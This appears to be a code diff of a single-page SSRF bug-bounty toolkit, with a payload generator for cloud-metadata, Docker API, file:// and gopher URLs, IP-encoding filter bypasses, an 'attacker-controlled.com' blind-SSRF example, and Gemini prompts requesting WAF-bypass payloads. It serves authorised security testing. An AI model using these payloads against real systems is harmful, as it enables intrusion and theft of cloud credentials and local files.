-                            <h4 class="font-bold text-stone-800 mb-2">Blind SSRF</h4>
-                            <p class="text-sm text-stone-600 mb-4">
-                                The application fetches the URL but does not return the content. You must rely on out-of-band (OOB) interactions.
-                            </p>
-                            <div class="bg-stone-100 p-4 rounded border-l-4 border-orange-500">
-                                <p class="text-xs font-mono text-stone-700">
-                                    <strong>Request:</strong> POST /track?url=http://attacker-controlled.com<br>
-                                    <strong>Response:</strong> 200 OK "Tracking enabled"<br>
-                                    <strong>Attacker Log:</strong> [DNS Query] received.
-                                </p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Tab Content: Bypass -->
-                <div id="tab-bypass" class="hidden p-6 md:p-8 animate-fade">
-                    <h3 class="text-lg font-bold text-stone-800 mb-4">Filter Evasion Techniques</h3>
-                    <p class="text-stone-600 text-sm mb-6">Developers often blacklist "localhost". Here is how to bypass those filters.</p>
-                    
-                    <div class="space-y-4">
-                        <div class="flex flex-col sm:flex-row gap-4">
-                            <div class="flex-1 bg-white border border-stone-200 rounded p-4 hover:shadow-md transition-shadow">
-                                <h5 class="font-bold text-stone-800 text-sm">DNS Rebinding</h5>
-                                <p class="text-xs text-stone-500 mt-1">Configure a domain with a very short TTL. First resolution returns a public IP, second resolution returns 127.0.0.1.</p>
-                            </div>
-                            <div class="flex-1 bg-white border border-stone-200 rounded p-4 hover:shadow-md transition-shadow">
-                                <h5 class="font-bold text-stone-800 text-sm">Alternative Encodings</h5>
-                                <p class="text-xs text-stone-500 mt-1">Use Enclosed Alphanumerics (①②⑦.⓪.⓪.①) or mix hex/octal to confuse the regex parser.</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section: Mitigation -->
-        <section id="mitigation" class="hidden space-y-6">
-            <div class="mb-8">
-                <h2 class="text-2xl font-bold text-stone-800">Remediation & Defense</h2>
-                <p class="text-stone-600 mt-2 max-w-3xl">
-                    Reporting an SSRF is not enough; providing actionable remediation advice increases the value of your report.
-                </p>
-            </div>
-
-            <div class="space-y-4">
-                <div class="bg-white border border-stone-200 rounded-lg p-6">
-                    <div class="flex items-start gap-4">
-                        <div class="bg-green-100 text-green-700 p-2 rounded text-xl">🛡️</div>
-                        <div>
-                            <h3 class="font-bold text-stone-800 text-lg">Strict Allowlisting (Whitelisting)</h3>
-                            <p class="text-stone-600 text-sm mt-2">
-                                The most effective defense. Only allow the application to fetch from specific, pre-approved domains or IP ranges.
-                            </p>
-                        </div>
-                    </div>
+                <div class="flex-1 bg-stone-50 p-6 flex flex-col">
+                    <textarea id="ai-report-output" readonly class="flex-1 bg-white border border-stone-200 rounded p-4 text-xs font-mono text-stone-700 resize-none focus:outline-none shadow-inner leading-relaxed"></textarea>
                 </div>
             </div>
         </section>
 
     </main>
 
+    <!-- LOGIC -->
     <script>
-        // --- Gemini API Logic ---
-        const apiKey = ""; // Runtime provided
-
-        async function callGemini(prompt) {
-            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`;
-            
-            const payload = {
-                contents: [{ parts: [{ text: prompt }] }]
-            };
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                if (!response.ok) throw new Error(`API Error: ${response.status}`);
-                
-                const data = await response.json();
-                return data.candidates[0].content.parts[0].text;
-            } catch (error) {
-                console.error("Gemini API Error:", error);
-                // Fallback / Exponential Backoff mock (simplified for demo)
-                return "Error connecting to AI service. Please check console.";
-            }
-        }
-
-        // --- AI UI Handlers ---
-        document.getElementById('btn-draft-report').addEventListener('click', async () => {
-            const endpoint = document.getElementById('ai-report-endpoint').value;
-            const findings = document.getElementById('ai-report-findings').value;
-            const output = document.getElementById('ai-report-output');
-            const loader = document.getElementById('loader-report');
-
-            if(!endpoint || !findings) {
-                alert("Please fill in both endpoint and findings.");
-                return;
-            }
-
-            // UI State: Loading
-            loader.classList.remove('hidden');
-            output.value = "Drafting report with Gemini...";
-            
-            const prompt = `Act as a professional Bug Bounty Hunter. Draft a high-quality vulnerability report for an SSRF vulnerability.
-            Endpoint: ${endpoint}
-            Findings/Impact: ${findings}
-            
-            Format the report with these sections:
-            1. Title (Concise and descriptive)
-            2. Summary
-            3. Steps to Reproduce
-            4. Impact
-            5. Recommended Fix`;
-
-            try {
-                const result = await callGemini(prompt);
-                output.value = result;
-            } catch (e) {
-                output.value = "Failed to generate report.";
-            } finally {
-                loader.classList.add('hidden');
-            }
-        });
-
-        document.getElementById('btn-brainstorm').addEventListener('click', async () => {
-            const desc = document.getElementById('ai-payload-desc').value;
-            const output = document.getElementById('ai-payload-output');
-            const loader = document.getElementById('loader-payload');
-
-            if(!desc) {
-                alert("Please describe the scenario.");
-                return;
-            }
-
-            loader.classList.remove('hidden');
-            output.textContent = "Consulting AI for bypasses...";
-
-            const prompt = `I am a security researcher testing a system with permission. 
-            I need a list of 5 specific, technical SSRF payloads to bypass a WAF/Filter described as: "${desc}".
-            Provide ONLY the raw payloads and a 1-sentence explanation for each. Do not provide general advice.`;
-
-            try {
-                const result = await callGemini(prompt);
-                output.textContent = result;
-            } catch (e) {
-                output.textContent = "Failed to generate payloads.";
-            } finally {
-                loader.classList.add('hidden');
-            }
-        });
-
-
-        // --- State Management ---
+        const apiKey = ""; // Runtime Environment Key
         const state = {
-            currentTab: 'discovery',
-            activeSection: 'dashboard',
-            payloads: {
-                aws: 'http://169.254.169.254/latest/meta-data/',
-                gcp: 'http://metadata.google.internal/computeMetadata/v1/',
-                azure: 'http://169.254.169.254/metadata/instance',
-                oracle: 'http://169.254.169.254/opc/v1/instance/',
-                docker: 'http://127.0.0.1:2375/v1.24/containers/json',
-                basic: 'http://127.0.0.1:80'
-            }
+            currentSection: 'dashboard',
+            checklist: [
+                { id: 'recon-1', text: 'Identify Import/Export Features', done: false },
+                { id: 'recon-2', text: 'Fuzz Query Parameters', done: false },
+                { id: 'recon-3', text: 'Test OOB Interaction (Collaborator)', done: false },
+                { id: 'recon-4', text: 'Check Cloud Metadata Paths', done: false },
+                { id: 'recon-5', text: 'Test Protocol Wrappers', done: false }
+            ]
         };
 
-        // --- Navigation Logic ---
+        // --- INIT ---
+        document.addEventListener('DOMContentLoaded', () => {
+            loadScratchpad();
+            loadChecklist();
+            initCharts();
+        });
+
         function navigateTo(sectionId) {
-            // Update UI State
             document.querySelectorAll('section').forEach(sec => sec.classList.add('hidden'));
             document.getElementById(sectionId).classList.remove('hidden');
             
-            // Update Sidebar Active State
             document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
             document.getElementById(`nav-${sectionId}`).classList.add('active');
-            
-            state.activeSection = sectionId;
+            if(sectionId === 'dashboard') window.dispatchEvent(new Event('resize'));
+        }
 
-            // Resize charts if dashboard is revisited (Chart.js quirk fix)
-            if(sectionId === 'dashboard') {
-                window.dispatchEvent(new Event('resize'));
+        // --- PASSIVE SCANNER LOGIC (NEW) ---
+        const ssrfParams = [
+            'url', 'uri', 'link', 'dest', 'redirect', 'src', 'path', 'feed', 'host', 'port', 'to', 'out', 'view', 'file', 'document', 'folder', 'root', 'img_url', 'page', 'site', 'html', 'data', 'reference', 'val', 'validate', 'domain', 'callback', 'webhook', 'target', 'proxy', 'download'
+        ];
+
+        function runPassiveScan() {
+            const input = document.getElementById('scan-input').value;
+            const outputDiv = document.getElementById('scan-output');
+            const countSpan = document.getElementById('scan-count');
+            
+            if(!input.trim()) {
+                outputDiv.innerHTML = '<div class="h-full flex flex-col items-center justify-center text-stone-400 text-sm"><span>No input provided.</span></div>';
+                return;
             }
+
+            const urls = input.split('\n').filter(u => u.trim() !== '');
+            const findings = [];
+
+            urls.forEach(urlStr => {
+                try {
+                    // Basic heuristic: check if string contains params even if not full URL
+                    const urlObj = new URL(urlStr.startsWith('http') ? urlStr : `http://${urlStr}`);
+                    urlObj.searchParams.forEach((val, key) => {
+                        if(ssrfParams.some(p => key.toLowerCase().includes(p))) {
+                            findings.push({ url: urlStr, param: key, val: val });
+                        }
+                    });
+                } catch(e) {
+                    // Fallback regex for partial paths
+                    ssrfParams.forEach(p => {
+                        if(urlStr.includes(`${p}=`)) {
+                             findings.push({ url: urlStr, param: p, val: 'N/A' });
+                        }
+                    });
+                }
+            });
+
+            // Remove duplicates
+            const uniqueFindings = findings.filter((v,i,a)=>a.findIndex(t=>(t.url===v.url && t.param===v.param))===i);
+
+            countSpan.textContent = `${uniqueFindings.length} Candidates`;
+
+            if(uniqueFindings.length === 0) {
+                 outputDiv.innerHTML = '<div class="h-full flex flex-col items-center justify-center text-stone-400 text-sm"><span>No hits found in provided URLs.</span></div>';
+                 return;
+            }
+
+            let html = '<div class="w-full">';
+            uniqueFindings.forEach(f => {
+                html += `
+                    <div class="p-4 border-b border-stone-100 hover:bg-orange-50 transition-colors group">
+                        <div class="flex items-center gap-2 mb-1">
+                            <span class="px-2 py-0.5 bg-orange-100 text-orange-700 text-[10px] font-bold uppercase rounded">SSRF Candidate</span>
+                            <span class="text-stone-800 font-bold font-mono text-xs">?${f.param}=</span>
+                        </div>
+                        <div class="text-xs text-stone-500 font-mono break-all group-hover:text-stone-800">${f.url}</div>
+                    </div>
+                `;
+            });
+            html += '</div>';
+            outputDiv.innerHTML = html;
         }
 
-        // --- Tab Logic ---
-        function switchTab(tabId) {
-            document.getElementById('tab-discovery').classList.add('hidden');
-            document.getElementById('tab-testing').classList.add('hidden');
-            document.getElementById('tab-bypass').classList.add('hidden');
-            
-            document.getElementById(`tab-${tabId}`).classList.remove('hidden');
-            
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-            state.currentTab = tabId;
+
+        // --- DASHBOARD LOGIC ---
+        function loadScratchpad() {
+            const saved = localStorage.getItem('ssrf-scratchpad');
+            if (saved) document.getElementById('scratchpad').value = saved;
+            document.getElementById('scratchpad').addEventListener('input', (e) => {
+                localStorage.setItem('ssrf-scratchpad', e.target.value);
+                const status = document.getElementById('save-status');
+                status.textContent = 'Saving...';
+                setTimeout(() => status.textContent = 'Auto-saved', 1000);
+            });
         }
-
-        // --- Chart Initialization ---
-        document.addEventListener('DOMContentLoaded', () => {
-            initEntryPointsChart();
-            initImpactChart();
-            setupPayloadGenerator();
-        });
-
-        function initEntryPointsChart() {
+        function downloadNotes() {
+            const blob = new Blob([document.getElementById('scratchpad').value], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'ssrf-notes.txt';
+            a.click();
+        }
+        function loadChecklist() {
+            const saved = localStorage.getItem('ssrf-checklist');
+            if (saved) state.checklist = JSON.parse(saved);
+            renderChecklist();
+        }
+        function renderChecklist() {
+            const container = document.getElementById('checklist-container');
+            container.innerHTML = '';
+            let doneCount = 0;
+            state.checklist.forEach((item, index) => {
+                if(item.done) doneCount++;
+                const div = document.createElement('div');
+                div.className = `flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors ${item.done ? 'bg-green-50 border-green-200' : 'bg-stone-50 border-stone-100 hover:bg-white'}`;
+                div.onclick = () => {
+                    state.checklist[index].done = !state.checklist[index].done;
+                    renderChecklist();
+                    localStorage.setItem('ssrf-checklist', JSON.stringify(state.checklist));
+                };
+                div.innerHTML = `<div class="w-5 h-5 rounded border flex items-center justify-center ${item.done ? 'bg-green-500 border-green-500 text-white' : 'bg-white border-stone-300'}">${item.done ? '✓' : ''}</div><span class="text-sm ${item.done ? 'text-stone-400 line-through' : 'text-stone-700 font-medium'}">${item.text}</span>`;
+                container.appendChild(div);
+            });
+            document.getElementById('progress-text').textContent = `${doneCount}/${state.checklist.length} Completed`;
+        }
+        function initCharts() {
             const ctx = document.getElementById('entryPointsChart').getContext('2d');
             new Chart(ctx, {
                 type: 'bar',
                 data: {
-                    labels: ['Webhook Config', 'Image/File Upload', 'PDF Generator', 'Proxy/Scraper', 'Link Preview', 'API Import'],
-                    datasets: [{
-                        label: 'Frequency',
-                        data: [25, 20, 15, 15, 15, 10],
-                        backgroundColor: 'rgba(234, 88, 12, 0.7)',
-                        borderColor: 'rgba(234, 88, 12, 1)',
-                        borderWidth: 1
-                    }]
+                    labels: ['API Integration', 'Webhook', 'PDF/Img Gen', 'File Upload', 'Preview'],
+                    datasets: [{ label: 'Risk Probability', data: [85, 70, 65, 50, 45], backgroundColor: '#ea580c', borderRadius: 4 }]
                 },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: { legend: { display: false } },
-                    scales: { y: { beginAtZero: true, max: 30 } }
-                }
+                options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true, grid: { display: false } }, x: { grid: { display: false } } } }
             });
         }
+        function resetChecklist() { state.checklist.forEach(i => i.done = false); renderChecklist(); }
 
-        function initImpactChart() {
-            const ctx = document.getElementById('impactChart').getContext('2d');
-            new Chart(ctx, {
-                type: 'doughnut',
-                data: {
-                    labels: ['Internal Port Scan', 'Cloud Metadata (RCE)', 'Local File Read', 'Internal API Access'],
-                    datasets: [{
-                        data: [40, 15, 20, 25],
-                        backgroundColor: ['#d6d3d1', '#ea580c', '#f97316', '#78716c'],
-                        borderWidth: 0
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: { legend: { position: 'bottom' } }
-                }
+        // --- PAYLOAD LOGIC ---
+        function generatePayloads() {
+            const target = document.getElementById('pf-target').value;
+            const bypass = document.getElementById('pf-bypass').value;
+            const protos = Array.from(document.querySelectorAll('.pf-proto:checked')).map(c => c.value);
+            const output = document.getElementById('pf-output');
+
+            const bases = {
+                'aws': '169.254.169.254/latest/meta-data/',
+                'gcp': 'metadata.google.internal/computeMetadata/v1/',
+                'azure': '169.254.169.254/metadata/instance',
+                'digitalocean': '169.254.169.254/metadata/v1/',
+                'docker': '127.0.0.1:2375/v1.24/containers/json',
+                'localhost': '127.0.0.1'
+            };
+
+            let ip = bases[target].split('/')[0].split(':')[0];
+            if(target === 'gcp') ip = '169.254.169.254';
+
+            let results = [];
+            let obsIp = ip;
+            if (bypass === 'decimal') obsIp = ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet), 0) >>> 0;
+            else if (bypass === 'octal') obsIp = ip.split('.').map(o => '0' + parseInt(o).toString(8)).join('.');
+            else if (bypass === 'hex') obsIp = '0x' + ip.split('.').map(o => parseInt(o).toString(16).padStart(2, '0')).join('');
+            else if (bypass === 'enclosed') { obsIp = '①⑥⑨.②⑤④.①⑥⑨.②⑤④'; if(target === 'localhost') obsIp = '①②⑦.⓪.⓪.①'; }
+
+            protos.forEach(proto => {
+                let path = bases[target].substring(bases[target].indexOf('/'));
+                if (path === bases[target]) path = "";
+                if (proto === 'http') { results.push(`http://${obsIp}${path}`); results.push(`https://${obsIp}${path}`); }
+                else if (proto === 'file') { results.push(`file:///etc/passwd`); results.push(`file:///c:/windows/win.ini`); }
+                else if (proto === 'gopher') results.push(`gopher://${obsIp}:25/_HELO target`);
+                else if (proto === 'dict') results.push(`dict://${obsIp}:11211/stat`);
             });
+
+            output.value = results.join('\n');
         }
 
-        function setupPayloadGenerator() {
-            const generateBtn = document.getElementById('generateBtn');
-            const targetSelect = document.getElementById('targetEnv');
-            const obsSelect = document.getElementById('obfuscationType');
-            const output = document.getElementById('payloadOutput');
-
-            generateBtn.addEventListener('click', () => {
-                const target = targetSelect.value;
-                const obs = obsSelect.value;
-                let baseUrl = state.payloads[target];
-                let finalPayloads = [];
-
-                let ip = '127.0.0.1';
-                if(target.includes('169.254')) ip = '169.254.169.254';
-
-                if (obs === 'none') {
-                    finalPayloads.push(baseUrl);
-                } else if (obs === 'decimal') {
-                    const decimalIP = ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet), 0) >>> 0;
-                    finalPayloads.push(baseUrl.replace(ip, decimalIP));
-                } else if (obs === 'octal') {
-                    const octalIP = ip.split('.').map(o => '0' + parseInt(o).toString(8)).join('.');
-                    finalPayloads.push(baseUrl.replace(ip, octalIP));
-                } else if (obs === 'hex') {
-                    const hexIP = '0x' + ip.split('.').map(o => parseInt(o).toString(16).padStart(2, '0')).join('');
-                    finalPayloads.push(baseUrl.replace(ip, hexIP));
-                } else if (obs === 'dottedhex') {
-                    const dHex = ip.split('.').map(o => '0x' + parseInt(o).toString(16)).join('.');
-                    finalPayloads.push(baseUrl.replace(ip, dHex));
-                } else if (obs === 'short') {
-                    if(target === 'basic') finalPayloads.push('http://0/');
-                    else finalPayloads.push('N/A for this target');
-                }
-
-                if (obs === 'none') {
-                    finalPayloads.push(`url=${baseUrl}`);
-                    finalPayloads.push(`request=${baseUrl}`);
-                }
-                output.value = finalPayloads.join('\n');
-            });
+        // --- GEMINI LOGIC ---
+        async function callGemini(prompt) {
+            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`;
+            try {
+                const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] }) });
+                if (!response.ok) throw new Error('API Error');
+                const data = await response.json();
+                return data.candidates[0].content.parts[0].text;
+            } catch (e) { return "Error contacting AI. Please check console."; }
         }
 
-        function copyPayloads() {
-            const copyText = document.getElementById("payloadOutput");
-            copyText.select();
-            document.execCommand("copy");
-            alert("Payloads copied to clipboard!");
+        document.getElementById('btn-draft-report').addEventListener('click', async () => {
+            const el = document.getElementById('loader-report'); const output = document.getElementById('ai-report-output');
+            el.classList.remove('hidden'); output.value = "Drafting...";
+            const prompt = `Draft a Bug Bounty Report for SSRF. Endpoint: ${document.getElementById('ai-report-endpoint').value}. Findings: ${document.getElementById('ai-report-findings').value}. Include: Summary, Impact, Steps, Remediation. Markdown.`;
+            output.value = await callGemini(prompt); el.classList.add('hidden');
+        });
+
+        async function genTemplate() {
+            const el = document.getElementById('loader-nuclei'); const output = document.getElementById('template-output');
+            el.classList.remove('hidden'); output.value = "Generating YAML...";
+            const prompt = `Generate a valid Nuclei Template (YAML) for this SSRF scenario: "${document.getElementById('template-desc').value}". Ensure severity classification.`;
+            output.value = (await callGemini(prompt)).replace(/```yaml/g, '').replace(/```/g, ''); el.classList.add('hidden');
         }
+
+        async function runAudit() {
+            const code = document.getElementById('audit-input').value; if(!code.trim()) return;
+            const loader = document.getElementById('loader-audit'); const outputDiv = document.getElementById('audit-output');
+            loader.classList.remove('hidden'); outputDiv.innerHTML = '<p class="text-stone-500 animate-pulse">Analyzing...</p>';
+            const prompt = `Analyze this code for SSRF vulnerabilities: \n${code}\n Output: Verdict, Vulnerable Line, Explanation, Fix. Markdown.`;
+            outputDiv.innerHTML = marked.parse(await callGemini(prompt)); loader.classList.add('hidden');
+        }
+
+        function copyToClipboard(id) { document.getElementById(id).select(); document.execCommand('copy'); alert('Copied'); }
     </script>
 </body>
 </html>
